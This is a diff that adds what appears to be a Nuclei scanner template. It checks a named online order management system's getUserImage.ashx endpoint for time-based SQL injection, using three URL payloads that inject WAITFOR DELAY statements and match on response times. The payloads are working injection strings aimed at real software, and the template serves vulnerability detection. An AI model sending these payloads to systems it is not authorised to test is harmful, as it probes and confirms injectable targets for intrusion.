@@ -1,0 +1,22 @@
+id: TUTORSOFT-ERP-getUserImage-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 杜特网上订单管理系统getUserImage.ashx存在SQL注入漏洞。
+  tags: tags
+variables:
+  username: "{{rand_base(6)}}"  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ajax/getUserImage.ashx?locadCode=admin%27/**/and(select+1)>0waitfor/**/delay%270:0:3"
+      - "{{BaseURL}}/ajax/getUserImage.ashx?locadCode=admin%27/**/and(select+1)>0waitfor/**/delay%270:0:6"
+      - "{{BaseURL}}/ajax/getUserImage.ashx?locadCode=admin%27/**/and(select+1)>0waitfor/**/delay%270:0:9"
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
